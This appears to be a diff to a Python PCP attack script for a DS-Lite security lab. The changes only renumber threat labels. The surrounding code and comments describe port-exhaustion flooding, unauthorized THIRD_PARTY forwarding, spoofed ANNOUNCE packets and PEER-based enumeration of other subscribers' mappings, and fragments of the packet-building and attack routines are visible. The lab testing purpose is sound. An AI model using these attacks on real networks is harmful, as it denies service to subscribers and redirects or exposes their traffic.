@@ -1,8 +1,8 @@
 #!/usr/bin/python
 # TS2 – PCP Port Exhaustion DoS
-# T6 – Unauthorized THIRD_PARTY Forwarding
+# T8 – Unauthorized THIRD_PARTY Forwarding
 # TS3 – PCP ANNOUNCE Spoofing (epoch reset attack)
-# T7 – PCP PEER Abuse (external address enumeration)
+# T9 – PCP PEER Abuse (external address enumeration)
 #
 # PCP (Port Control Protocol, RFC 6887) manages port mappings on the AFTR.
 # The DS-Lite lab uses PCP in "plain mode" (draft-ietf-pcp-dslite-00):
@@ -23,18 +23,18 @@
 #   TS2 (exhaust): Flood MAP requests to allocate all available ports (32768-65534)
 #                  → legitimate subscribers cannot get port mappings
 #
-#   T6 (third-party): Create mappings using THIRD_PARTY option for arbitrary
+#   T8 (third-party): Create mappings using THIRD_PARTY option for arbitrary
 #                  internal IPs → redirect internet traffic to any internal host
 #
 #   TS3 (announce): Spoof unsolicited ANNOUNCE on ISP path (or LAN) to trick
 #                  PCP clients into believing the AFTR has restarted → all
 #                  clients re-establish mappings, creating DoS or theft window
 #
-#   T7 (peer): Abuse PEER opcode to enumerate external IP:port assignments of
+#   T9 (peer): Abuse PEER opcode to enumerate external IP:port assignments of
 #               other subscribers → information disclosure for further attacks
 #
 # Attacker positions:
-#   TS2/T6/T7: B4 LAN (10.0.x.150) → send to B4 PCP proxy (10.0.x.1:5351)
+#   TS2/T8/T9: B4 LAN (10.0.x.150) → send to B4 PCP proxy (10.0.x.1:5351)
 #   TS3:         ISP network (eth-isp) → inject IPv6 PCP
 #
 # Usage:
@@ -76,7 +76,7 @@ def build_pcp_map_request(nonce, proto, internal_port, ext_port=0,
                            lifetime=3600, third_party_ip4=None):
     """
     Build a PCP MAP request (RFC 6887 Section 11.1).
-    Optional THIRD_PARTY option (T6).
+    Optional THIRD_PARTY option (T8).
     """
     # Client IP: zero-padded IPv4-mapped IPv6 (::ffff:0.0.0.0 for this source)
     client_ipv6 = b'\x00' * 10 + b'\xff\xff' + bytes([0, 0, 0, 0])
@@ -193,7 +193,7 @@ def send_pcp_request(proxy_ip, pkt, timeout=3):
     bypassed — so its THIRD_PARTY-stripping defence (b4/pcp_proxy.py) no
     longer applies and the attacker's own THIRD_PARTY option reaches the
     AFTR PCP server verbatim. This is the realistic ISP-side attack path
-    for TS2/T6/T7.
+    for TS2/T8/T9.
     """
     is_v6 = ":" in proxy_ip
     fam = socket.AF_INET6 if is_v6 else socket.AF_INET
@@ -346,11 +346,11 @@ def run_exhaust(args):
     print(f"[+] Sent {stats['sent']} PCP MAP requests, {stats['success']} mappings created")
 
 
-# ── T6: UNAUTHORIZED THIRD_PARTY ────────────────────────────────────────
+# ── T8: UNAUTHORIZED THIRD_PARTY ────────────────────────────────────────
 
 def run_third_party(args):
-    """T6: Create port mapping directing traffic to arbitrary internal IP."""
-    print(f"[*] T6 – Unauthorized THIRD_PARTY PCP Forwarding")
+    """T8: Create port mapping directing traffic to arbitrary internal IP."""
+    print(f"[*] T8 – Unauthorized THIRD_PARTY PCP Forwarding")
     print(f"[*] Target proxy: {args.proxy_ip}:{PCP_PORT}")
     print(f"[*] Target internal host: {args.target_internal}")
     print()
@@ -497,7 +497,7 @@ def run_announce_spoof(args):
     print(f"[+] Sent {sent} spoofed ANNOUNCE packets (epoch=0).")
 
 
-# ── T7: PEER ABUSE ──────────────────────────────────────────────────────
+# ── T9: PEER ABUSE ──────────────────────────────────────────────────────
 
 def build_pcp_peer_request(nonce, proto, internal_port,
                             remote_ip, remote_port, lifetime=3600,
@@ -548,7 +548,7 @@ def build_pcp_peer_request(nonce, proto, internal_port,
 
 def run_peer_abuse(args):
     """
-    T7: Abuse PEER opcode to enumerate other subscribers' external port mappings.
+    T9: Abuse PEER opcode to enumerate other subscribers' external port mappings.
 
     RFC 6887 §12: PEER returns the external IP:port assigned by the NAT for
     a given internal flow.  Without PCP authentication (RFC 7652), any LAN
@@ -560,7 +560,7 @@ def run_peer_abuse(args):
       - Pre-attack reconnaissance for downstream PCP attacks
       - Information disclosure: subscriber activity visible to attacker
     """
-    print(f"[*] T7 – PCP PEER Abuse (external address enumeration)")
+    print(f"[*] T9 – PCP PEER Abuse (external address enumeration)")
     print(f"[*] Target proxy: {args.proxy_ip}:{PCP_PORT}")
     print(f"[*] Target internal: {args.target_internal}")
     print(f"[*] Scanning ports: {args.scan_ports}")
@@ -590,7 +590,7 @@ def run_peer_abuse(args):
     # conntrack table for ANY of the THIRD_PARTY-claimed internal IP's flows
     # and returns the NAT-assigned external port of the first match. This
     # discovers an active mapping with NO knowledge of the victim's ephemeral
-    # source port — the realistic enumeration primitive (see T7).
+    # source port — the realistic enumeration primitive (see T9).
     print("[*] wildcard probe (int_port=0) — zero-knowledge mapping discovery")
     wpkt = build_pcp_peer_request(
         os.urandom(12), args.proto, 0, remote_ip, remote_port,
@@ -695,7 +695,7 @@ def run_map(args):
 
 def main():
     p = argparse.ArgumentParser(
-        description="TS2/T6/TS3 (+ T7 peer) – PCP Security Attacks\n"
+        description="TS2/T8/TS3 (+ T9 peer) – PCP Security Attacks\n"
                     "Targets the PCP Port Control Protocol (RFC 6887) in DS-Lite.\n"
                     "RFC 6887 opcodes: MAP(1), PEER(2), ANNOUNCE(0)",
         formatter_class=argparse.RawDescriptionHelpFormatter
@@ -717,9 +717,9 @@ def main():
                    help='Skip response wait (5-10x throughput) — recommended '
                         'for direct-to-AFTR pool exhaustion')
 
-    # T6
+    # T8
     tp = sub.add_parser('thirdparty',
-                        help='T6: Create THIRD_PARTY mapping for arbitrary internal host')
+                        help='T8: Create THIRD_PARTY mapping for arbitrary internal host')
     tp.add_argument('--proxy-ip', default='10.0.1.1',
                     help='B4 PCP proxy IPv4 (default: 10.0.1.1)')
     tp.add_argument('--target-internal', default='10.0.2.100',
@@ -745,9 +745,9 @@ def main():
     an.add_argument('--interval', type=float, default=1.0,
                     help='Interval between packets in seconds (default: 1.0)')
 
-    # T7
+    # T9
     pe = sub.add_parser('peer',
-                        help='T7: Abuse PEER opcode to enumerate external port mappings')
+                        help='T9: Abuse PEER opcode to enumerate external port mappings')
     pe.add_argument('--proxy-ip', default='10.0.1.1',
                     help='B4 PCP proxy IPv4 (default: 10.0.1.1)')
     pe.add_argument('--target-internal', default='10.0.1.100',
